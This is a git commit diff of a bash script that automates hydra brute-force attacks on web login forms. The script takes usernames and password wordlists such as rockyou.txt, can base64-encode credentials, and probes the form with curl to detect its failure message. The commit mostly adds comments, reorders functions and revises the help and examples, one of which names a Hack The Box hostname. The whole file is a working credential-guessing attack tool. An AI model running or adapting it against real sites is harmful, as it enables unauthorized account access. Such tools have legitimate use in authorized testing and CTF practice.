1429e94220c77753c40848792edd6d5539161a76
YSSVirus <56813561+YSSVirus@users.noreply.github.com>
2022-05-25 08:00:22 -0700

    bug fixes
    There we some issues with the script so I cleaned it up and made it smoother some updates and cleaned up the help. aswell as better notes in the script

--- Brute_forcing/http-post-form_bruteforce.sh
+++ Brute_forcing/http-post-form_bruteforce.sh
@@ -47,36 +47,15 @@ h="-h"
 hh="--h"
 help="-help"
 help_help="--help"
-
+#this is where we store the examples
 examples() {
-	echo "Any option within { } is required"
-	echo "If you choose to do an optional argument the previous argument is needed, even if it is optional"
-	echo "(this will be switched when i switch it to marked arguments example: -p)"
-	echo ""
-	echo ""
-	echo "Minimal Examples"
-	echo ""
-	echo "Example: ./Script.sh --target 'internal-administration.goodgames.htb' --user username --pass password"
-	echo ""
-	echo "Example: ./Script.sh domain.com user password"
-	echo "Example: ./Script.sh domain.com user password_file.txt"
-	echo ""
-	echo "Example: ./Script.sh domain.com user_file.txt password "
-	echo "Example: ./Script.sh domain.com user_file.txt password_file.txt"
-	echo ""
-	echo ""
-	echo "Extended Examples"
-	echo ""
-	echo "Example: ./Script.sh {domain with the . extension} {Username or Username List} {password or password List} <The websites sub-directory> <The text displayed if credentials are incorrect> <true or false to add &submit= paramater (this is at the end of alot of websites submissions)> <Thread count>"
-	echo ""
-	echo "Example: ./Script.sh domain.com user password 'home/login' 'These credentials are wrong' True 45"
-	echo "Example: ./Script.sh domain.com user password_file.txt 'login' 'incorrect' False 12"
+	echo "bash http-post-form_bruteforce.sh --target website.com --subdirectory login --user Admin --pass ~/Wordlists/Password_Lists/rockyou.txt --login_paramater f --incorrect_text 'Invalid Password' --encode_creds f --threads 10"
 }
-
+#this is a variable for the target
 target() {
 	target="$stripped_next_arg"
 }
-
+#this is a variable for the user or userlist
 user() {
 	user_name="$stripped_next_arg"
 	if [[ -e "$user_name" ]]; then
@@ -85,7 +64,7 @@ user() {
 		username="-l $user_name"
 	fi
 }
-
+#this is a variable for the pass or passlist
 pass() {
 	passwords="$stripped_next_arg"
 	#This checks to see if the argument exists as a file. If so it uses the password list argument, if it isnt a file it assigns the password argument 
@@ -95,7 +74,7 @@ pass() {
 		password="-p $passwords"
 	fi
 }
-
+#this is a variable for the subdirector of the login page
 subdirectory() {
 	if [[ $stripped_next_arg = " " ]]; then
 		#This assigns the variable sub-directory to alot of websites default, which is the login page
@@ -104,7 +83,7 @@ subdirectory() {
 		sub_directory_var=$stripped_next_arg
 	fi
 }
-
+#here we try to automaticly find the incorrect text if it isnt supplied
 automated_text_grabber() {
 	curl -X POST "$target/$sub_directory_var" -d "username=TestUser&password=Testpassword&login=" | grep "Wrong\|wrong\|Incorrect\|incorrect" > incorrect-text_unclean.log
 	echo $(cat incorrect-text_unclean.log) > incorrect-text_clean.log
@@ -119,7 +98,7 @@ automated_text_grabber() {
 		exit
 	fi
 }
-
+#this is a variable for defining incorrect text
 incorrect_text() {
 	if [[ $stripped_next_arg = " " ]]; then
 		automated_text_grabber
@@ -127,7 +106,7 @@ incorrect_text() {
 		incorrect=$stripped_next_arg
 	fi
 }
-
+#this is a variable for controlling number of threads
 threads() {	
 	if [[ $stripped_next_arg = " " ]]; then
 		#This assigns the variable sub-directory to alot of websites default, which is the login page
@@ -136,7 +115,7 @@ threads() {
 		thread_count="-t $stripped_next_arg"
 	fi
 }
-
+#this is a variable for addin the blank "login=" paramater
 login_paramater() {
 	#This adds &login= to thee paramaters as default, this is because most forms have this in the tail end
 	if [[ $stripped_next_arg = " " || $stripped_next_arg = "t" || $stripped_next_arg = "T" || $stripped_next_arg = "true" || $stripped_next_arg = "True" || $stripped_next_arg = "TRUE" ]]; then
@@ -147,6 +126,7 @@ login_paramater() {
 		log_in=""
 	fi
 }
+#this is a variable for encoding credentials
 encode_creds() {
 	unencoded_user_var="^USER^"
 	unencoded_password_var="^PASS^"
@@ -158,60 +138,13 @@ encode_creds() {
 		user_var="$encoded_user_var"
 		password_var="$encoded_password_var"
 		echo encoded
-		echo $stripped_next_arg" does = t T true True or TRUE"
 	else
 		echo "unencoded"
 		user_var="$unencoded_user_var"
 		password_var="$unencoded_password_var"
-		echo $stripped_next_arg" doesnt = t T true True or TRUE"	
 	fi
 }
-
-main_function() {
-	for arg in "--threads" "--target" "--user" "--pass" "--subdirectory" "--incorrect_text" "--login_paramater" "--encode_creds"; do
-		if [[ $first == $arg ]]; then
-			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
-			stripped_next_arg=$second
-			$stripped_arg $stripped_next_arg
-		elif [[ $third == $arg ]]; then
-			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
-			stripped_next_arg=$fourth
-			$stripped_arg $stripped_next_arg
-		elif [[ $fifth == $arg ]]; then
-			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
-			stripped_next_arg=$sixth
-			$stripped_arg $stripped_next_arg
-		elif [[ $seventh == $arg ]]; then
-			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
-			stripped_next_arg=$eighth
-			$stripped_arg $stripped_next_arg
-		elif [[ $ninth == $arg ]]; then
-			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
-			stripped_next_arg=$tenth
-			$stripped_arg $stripped_next_arg
-		elif [[ $eleventh == $arg ]]; then
-			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
-			stripped_next_arg=$twelvth
-			$stripped_arg $stripped_next_arg
-		elif [[ $thirteenth == $arg ]]; then
-			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
-			stripped_next_arg=$fourteenth
-			$stripped_arg $stripped_next_arg
-		elif [[ $fifthteenth == $arg ]]; then
-			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
-			stripped_next_arg=$sixteenth
-			$stripped_arg $stripped_next_arg
-		else
-			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
-			stripped_next_arg=" "
-			echo "the argument: "$stripped_arg" is being set automaticly to make thise easier for you :)"
-			echo""
-			$stripped_arg $stripped_next_arg
-		fi
-	done
-	hydra $thread_count -I $username $password $target http-post-form /"$sub_directory_var:username=$user_var&password=$password_var$log_in:$incorrect"
-
-}
+#this is where we store the help part
 help() {
 	clear
 	echo ""
@@ -225,6 +158,11 @@ help() {
 		This argument is for the targets domain
 			Example: 
 				--target example.htb
+
+	--threads
+		This argument is how many threads you would like
+			Example: 
+				--threads 30
 
 			--user
 		This argument is for either a username or a user_file
@@ -275,23 +213,23 @@ help() {
 		--encode_creds
 			This argument is a true or false whether or not to base 64 encode the payloads
 				Default:
-					--login_paramater FALSE
-					--login_paramater f
+					--encode_creds FALSE
+					--encode_creds f
 				Example:
-					--login_paramater TRUE
-					--login_paramater t
-					--login_paramater FALSE
-					--login_paramater f"
+					--encode_creds TRUE
+					--encode_creds t
+					--encode_creds FALSE
+					--encode_creds f"
 	echo ""
 	echo""
 	echo ""
-	echo "Here are some Examples"
-	echo ""
+	echo "Here is an example"
 	examples
 }
+#This checks for any help arguments in any way
 check_any_help() {
 	for all_variables in "$first" "$second" "$third" "$fourth" "$fifth" "$sixth" "$seventh" "$eighth" "$ninth" "$tenth" "$eleventh" "$twelvth" "$thirteenth" "$fourteenth" "$fifthteenth" "$sixteenth" "$seventeenth" "$eighteenth"; do
-		for help in "-h" "-H" "-help" "-Help" "-HELP" "-hh"; do
+		for help in "-h" "-H" "-help" "-Help" "-HELP" "--h" "--H" "--help" "--Help" "--HELP"; do
 			if [[ "$all_variables" = "$help" ]]; then
 				will_help="help"
 			else 
@@ -300,16 +238,64 @@ check_any_help() {
 		done
 	done
 }
+#This is the main function
+main_function() {
+	for arg in "--threads" "--target" "--user" "--pass" "--subdirectory" "--incorrect_text" "--login_paramater" "--encode_creds"; do
+		if [[ $first == $arg ]]; then
+			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
+			stripped_next_arg=$second
+			$stripped_arg $stripped_next_arg
+		elif [[ $third == $arg ]]; then
+			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
+			stripped_next_arg=$fourth
+			$stripped_arg $stripped_next_arg
+		elif [[ $fifth == $arg ]]; then
+			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
+			stripped_next_arg=$sixth
+			$stripped_arg $stripped_next_arg
+		elif [[ $seventh == $arg ]]; then
+			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
+			stripped_next_arg=$eighth
+			$stripped_arg $stripped_next_arg
+		elif [[ $ninth == $arg ]]; then
+			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
+			stripped_next_arg=$tenth
+			$stripped_arg $stripped_next_arg
+		elif [[ $eleventh == $arg ]]; then
+			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
+			stripped_next_arg=$twelvth
+			$stripped_arg $stripped_next_arg
+		elif [[ $thirteenth == $arg ]]; then
+			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
+			stripped_next_arg=$fourteenth
+			$stripped_arg $stripped_next_arg
+		elif [[ $fifthteenth == $arg ]]; then
+			stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
+			stripped_next_arg=$sixteenth
+			$stripped_arg $stripped_next_arg
+		#else
+		#	stripped_arg=$(echo $(echo $arg | sed 's/'..'\(.*\)/\1/'))
+		#	stripped_next_arg=" "
+		#	echo "the argument: "$stripped_arg" is being set automaticly to make thise easier for you :)"
+		#	echo""
+		#	$stripped_arg $stripped_next_arg
+		fi
+	done
+	hydra $thread_count -I $username $password $target http-post-form /"$sub_directory_var:username=$user_var&password=$password_var$log_in:$incorrect"
+
+}
+
 check_any_help
-echo "$arg_number"
 if [[ "$will_help" = "help" ]]; then
 	help
 else
 	if [[ "$arg_number" -le "$min_var_count" ]]; then
-		examples
+		#examples
+		help
 		exit
 	elif [[ "$arg_number" -ge "$max_var_count" ]]; then
-		examples
+		#examples
+		help
 		exit
 	else
 		main_function
